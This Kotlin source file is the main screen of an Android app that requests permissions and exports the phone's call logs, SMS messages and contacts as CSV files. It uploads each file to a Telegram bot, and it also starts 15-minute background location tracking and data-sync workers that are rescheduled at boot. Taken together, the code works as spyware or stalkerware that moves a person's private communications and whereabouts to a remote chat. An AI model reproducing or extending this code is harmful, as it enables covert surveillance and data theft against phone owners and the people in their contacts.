// MainActivity.kt
package com.example.lta

import android.Manifest
import android.content.Context
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.material3.Divider
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.work.*
import com.example.lta.ui.theme.LtaTheme
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

class MainActivity : ComponentActivity() {

    private lateinit var permissionManager: PermissionManager
    private lateinit var manualDataManager: ManualDataManager
    private lateinit var telegramBotApi: TelegramBotApi
    private lateinit var workManager: WorkManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        permissionManager = PermissionManager(this)
        manualDataManager = ManualDataManager(applicationContext)
        telegramBotApi = TelegramBotApi(
            applicationContext.getString(R.string.telegram_bot_token),
            applicationContext.getString(R.string.telegram_chat_id)
        )
        workManager = WorkManager.getInstance(applicationContext)

        setContent {
            LtaTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    ControlPanelScreen(
                        modifier = Modifier.padding(innerPadding),
                        permissionManager = permissionManager,
                        manualDataManager = manualDataManager,
                        telegramBotApi = telegramBotApi,
                        workManager = workManager
                    )
                }
            }
        }
    }
}

@Composable
fun ControlPanelScreen(
    modifier: Modifier = Modifier,
    permissionManager: PermissionManager,
    manualDataManager: ManualDataManager,
    telegramBotApi: TelegramBotApi,
    workManager: WorkManager
) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    var statusMessage by remember { mutableStateOf("Ready.") }

    // Reusable helper function to handle the entire CSV export and upload process
    val exportDataAsCsv: (dataType: String, mainPermission: String, secondPermission: String?, csvProvider: () -> String) -> Unit =
        { dataType, mainPermission, secondPermission, csvProvider ->
            
            // This is the core logic that generates, saves, and uploads the file.
            // It's wrapped in a lambda to be called after permissions are granted.
            val proceedWithExport = {
                coroutineScope.launch {
                    try {
                        // 1. Generate the CSV data on a background thread
                        statusMessage = "Generating $dataType CSV..."
                        val csvData = withContext(Dispatchers.IO) { csvProvider() }

                        if (csvData.lines().size <= 1) { // Check if only header is present
                            statusMessage = "$dataType: No data found to export."
                            Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
                            return@launch
                        }

                        // 2. Save the CSV data to a temporary file in the app's cache
                        val file = File.createTempFile(dataType.lowercase().replace(" ", "_"), ".csv", context.cacheDir)
                        file.writeText(csvData)

                        // 3. Upload the file using the Telegram API
                        statusMessage = "Uploading $dataType CSV..."
                        val success = telegramBotApi.sendDocument(file, "Exported $dataType from device.")
                        
                        // 4. Clean up the temporary file
                        file.delete()

                        // 5. Update the user
                        statusMessage = if (success) {
                            "$dataType export successful."
                        } else {
                            "Failed to export $dataType."
                        }
                        Toast.makeText(context, statusMessage, Toast.LENGTH_LONG).show()

                    } catch (e: Exception) {
                        statusMessage = "Error during export: ${e.message}"
                        Toast.makeText(context, statusMessage, Toast.LENGTH_LONG).show()
                        e.printStackTrace()
                    }
                }
            }

            // Start the permission request chain
            permissionManager.requestPermission(mainPermission,
                onGranted = {
                    // If a second permission is needed (e.g., READ_CONTACTS for names), request it.
                    if (secondPermission != null) {
                        permissionManager.requestPermission(secondPermission,
                            onGranted = { proceedWithExport() }
                        )
                    } else {
                        // Otherwise, just proceed.
                        proceedWithExport()
                    }
                }
            )
        }


    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(16.dp)
            .verticalScroll(rememberScrollState()),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text("Status: $statusMessage", fontWeight = FontWeight.Bold)
        Spacer(modifier = Modifier.height(16.dp))
        SectionHeader(title = "Background Workers")
        Button(onClick = {
            permissionManager.requestPermission(Manifest.permission.ACCESS_FINE_LOCATION) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    permissionManager.requestPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) {
                        BootCompletedReceiver.schedulePeriodicLocationWorker(context)
                        statusMessage = "Periodic location tracking started."
                        Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
                    }
                } else {
                    BootCompletedReceiver.schedulePeriodicLocationWorker(context)
                    statusMessage = "Periodic location tracking started."
                    Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
                }
            }
        }) {
            Text("Start Periodic Location (15 min)")
        }
        Spacer(modifier = Modifier.height(8.dp))
        Button(onClick = {
            workManager.cancelUniqueWork(LocationWorker.UNIQUE_WORK_NAME)
            statusMessage = "Periodic location tracking stopped."
            Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
        }) {
            Text("Stop Periodic Location")
        }
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = {
            BootCompletedReceiver.scheduleDataUploadWorker(context)
            statusMessage = "Periodic data/system sync started."
            Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
        }) {
            Text("Start Periodic Data Sync (15 min)")
        }
        Spacer(modifier = Modifier.height(8.dp))
        Button(onClick = {
            workManager.cancelUniqueWork("DataUploadWorker")
            statusMessage = "Periodic data sync stopped."
            Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
        }) {
            Text("Stop Periodic Data Sync")
        }
        SectionHeader(title = "Manual Actions & CSV Export")
        Button(onClick = {
            statusMessage = "Requesting one-time location..."
            permissionManager.requestPermission(Manifest.permission.ACCESS_FINE_LOCATION) {
                val oneTimeWorkRequest = OneTimeWorkRequestBuilder<LocationWorker>()
                    .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
                    .build()
                workManager.enqueue(oneTimeWorkRequest)
                statusMessage = "One-time location request enqueued."
                Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
            }
        }) {
            Text("Send Location Now")
        }
        Spacer(modifier = Modifier.height(16.dp))
        
        Button(onClick = {
            // FIX: Removed named arguments and passed them positionally.
            exportDataAsCsv(
                "Call Logs",
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS, // Ask for contacts to get names
                manualDataManager::getCallLogsAsCsv
            )
        }) {
            Text("Export Call Logs as CSV")
        }
        Spacer(modifier = Modifier.height(16.dp))

        Button(onClick = {
            // FIX: Removed named arguments and passed them positionally.
            exportDataAsCsv(
                "SMS",
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CONTACTS, // Ask for contacts to get names
                manualDataManager::getSmsAsCsv
            )
        }) {
            Text("Export SMS as CSV")
        }
        Spacer(modifier = Modifier.height(16.dp))

        Button(onClick = {
            // FIX: Removed named arguments and passed them positionally.
            exportDataAsCsv(
                "Contacts",
                Manifest.permission.READ_CONTACTS,
                null, // No second permission needed
                manualDataManager::getContactsAsCsv
            )
        }) {
            Text("Export Contacts as CSV")
        }
    }
}

@Composable
private fun SectionHeader(title: String) {
    Spacer(modifier = Modifier.height(16.dp))
    Divider()
    Spacer(modifier = Modifier.height(16.dp))
    Text(title, fontSize = 18.sp, fontWeight = FontWeight.Bold)
    Spacer(modifier = Modifier.height(16.dp))
}

/**
 * Convenience extension function for [PermissionManager] to request a single permission
 * and handle the denied case with a Toast message.
 */
fun PermissionManager.requestPermission(permission: String, onGranted: () -> Unit) {
    this.requestPermission(
        permission = permission,
        onGranted = onGranted,
        onDenied = {
            val context = (this as? ComponentActivity)?.baseContext ?: return@requestPermission
            val permissionName = permission.substringAfterLast('.').replace("_", " ")
            Toast.makeText(
                context,
                "Permission for $permissionName was denied. The feature cannot proceed.",
                Toast.LENGTH_LONG
            ).show()
        }
    )
}
